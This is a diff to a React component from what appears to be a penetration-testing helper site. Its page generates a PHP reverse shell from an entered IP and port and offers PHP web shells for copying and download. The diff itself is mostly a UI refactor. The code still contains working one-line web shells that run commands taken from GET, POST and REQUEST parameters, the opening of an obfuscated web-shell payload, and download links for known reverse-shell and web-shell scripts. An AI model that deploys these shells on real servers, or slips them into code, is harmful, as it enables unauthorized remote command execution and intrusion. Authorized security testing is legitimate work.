@@ -8,7 +8,6 @@ import {
     ArrowsAltOutlined,
     createFromIconfontCN
 } from '@ant-design/icons';
-import QueueAnim from 'rc-queue-anim';
 import Clipboard from 'react-clipboard.js';
 import SyntaxHighlighter from 'react-syntax-highlighter';
 import { Ipv4TcpCacheState } from "components/types/Ipv4TcpCacheState";
@@ -21,18 +20,23 @@ const IconFont = createFromIconfontCN( {
     scriptUrl: [ './iconfont.js' ]
 } );
 
+
+
 export default function PhpReverseShell () {
     const useIPv4State = PersistedState<Ipv4TcpCacheState>( 'ipv4_tcp_cache' );
     const [ values, setValues ] = useIPv4State( {
-        ip: 'A.B.C.D',
-        port: '1111',
+        ip: '',
+        port: '',
     } );
     const handleChange = ( name: string ) => ( event: { target: { value: string; }; } ) => {
         setValues( { ...values, [ name ]: event.target.value } );
     };
+
+    const [ messageApi, contextHolder ] = message.useMessage();
     const successInfoReverseShell = () => {
-        message.success( 'Your reverse shell has been copied successfully !' );
+        messageApi.success( 'Your reverse shell has been copied successfully !' );
     };
+
     const oneLiner = `<?php system($_GET["cmd"]);?>`;
     const shell_obfuscate =
         `<?=$_="";$_="'" \;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` +
@@ -190,41 +194,43 @@ export default function PhpReverseShell () {
   ?> 
   `;
     return (
-        <QueueAnim delay={300} duration={1500}>
-            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
-                PHP Reverse Shell
-            </Title>
-            <Paragraph style={{ margin: 15 }}>
-                Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to
-                obtain an interactive shell session on the target machine and continue their attack.
-            </Paragraph>
-            <div style={{ padding: 15 }}>
-                <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
-                    <Col span={12}>
-                        <Input
-                            maxLength={15}
-                            prefix={<WifiOutlined />}
-                            name='Ip adress'
-                            placeholder='IP Address or domain (ex: 212.212.111.222)'
-                            onChange={handleChange( 'ip' )}
-                            value={values.ip}
-                        />
-                    </Col>
-                    <Col span={12}>
-                        <Input
-                            maxLength={5}
-                            prefix={<IconFont type='icon-Network-Plug' />}
-                            name='Port'
-                            placeholder='Port (ex: 1337)'
-                            onChange={handleChange( 'port' )}
-                            value={values.port}
-                        />
-                    </Col>
-                </Row>
+        <div>
+            {contextHolder}
+            <div>
+                <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
+                    PHP Reverse Shell
+                </Title>
+                <Paragraph style={{ margin: 15 }}>
+                    Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to
+                    obtain an interactive shell session on the target machine and continue their attack.
+                </Paragraph>
+                <div style={{ padding: 15 }}>
+                    <Row gutter={{ xs: 8, sm: 16, md: 24, lg: 32 }}>
+                        <Col span={12}>
+                            <Input
+                                maxLength={15}
+                                prefix={<WifiOutlined />}
+                                name='Ip adress'
+                                placeholder='IP Address or domain (ex: 212.212.111.222)'
+                                onChange={handleChange( 'ip' )}
+                                value={values.ip}
+                            />
+                        </Col>
+                        <Col span={12}>
+                            <Input
+                                maxLength={5}
+                                prefix={<IconFont type='icon-Network-Plug' />}
+                                name='Port'
+                                placeholder='Port (ex: 1337)'
+                                onChange={handleChange( 'port' )}
+                                value={values.port}
+                            />
+                        </Col>
+                    </Row>
+                </div>
             </div>
             <Divider orientation='center'>Pentestmonkey's reverse shell</Divider>
             <div
-                key='a'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -236,15 +242,9 @@ export default function PhpReverseShell () {
                         <SyntaxHighlighter language='php' style={vs2015} showLineNumbers={true}>
                             {pretty( phpReverseShell )}
                         </SyntaxHighlighter>
-                        <Button type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
-                            <a
-                                href='https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php'
-                                target='_blank'
-                                rel='noreferrer noopener'
-                            >
-                                <ArrowsAltOutlined style={{ marginRight: 10 }} />
-                                Pentestmonkey's repository
-                            </a>
+                        <Button href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" target='blank' type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
+                            <ArrowsAltOutlined style={{ marginRight: 10 }} />
+                            Pentestmonkey's repository
                         </Button>
                     </Panel>
                 </Collapse>
@@ -257,7 +257,7 @@ export default function PhpReverseShell () {
                             type: 'text/plain'
                         } );
                         element.href = URL.createObjectURL( file );
-                        element.download = 'reverseShell.php';
+                        element.download = 'rev.php';
                         document.body.appendChild( element );
                         element.click();
                     }}
@@ -278,7 +278,6 @@ export default function PhpReverseShell () {
             </div>
             <Divider orientation="center">Basic RCE</Divider>
             <div
-                key='b'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -319,7 +318,6 @@ export default function PhpReverseShell () {
             </div>
             <Divider orientation="center">Web Shell</Divider>
             <div
-                key='c'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -338,24 +336,15 @@ export default function PhpReverseShell () {
                         />
                     </Panel>
                 </Collapse>
-                <Button type='primary' style={{ marginBottom: 10, marginTop: 15 }}>
-                    <a
-                        href='https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php'
-                        target='_blank'
-                        rel='noopener noreferrer'
-                    >
-                        <DownloadOutlined /> Download
-                    </a>
+                <Button href="https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php" target='blank' type='primary' style={{ marginBottom: 10, marginTop: 15 }}>
+                    <DownloadOutlined /> Download
                 </Button>
-                <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
-                    <a href='https://github.com/flozz/p0wny-shell' target='_blank' rel='noopener noreferrer'>
-                        <ArrowsAltOutlined /> Flozz's repository
-                    </a>
+                <Button href='https://github.com/flozz/p0wny-shell' target='blank' type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <ArrowsAltOutlined /> Flozz's repository
                 </Button>
             </div>
             <Divider orientation="center">Obfuscated PHP Web Shell</Divider>
             <div
-                key='d'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -380,13 +369,12 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={'<?=`$_GET[0]`?>'}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
             </div>
             <div
-                key='e'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -411,13 +399,12 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={'<?=`$_POST[0]`?>'}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
             </div>
             <div
-                key='f'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -444,13 +431,12 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
             </div >
             <div
-                key='f'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -476,13 +462,12 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={shell_obfuscate}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
             </div >
             <div
-                key='g'
                 style={{
                     padding: 15,
                     marginTop: 15
@@ -509,11 +494,11 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={shell_obfuscate_function}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
             </div >
-        </QueueAnim >
+        </div >
     );
 };
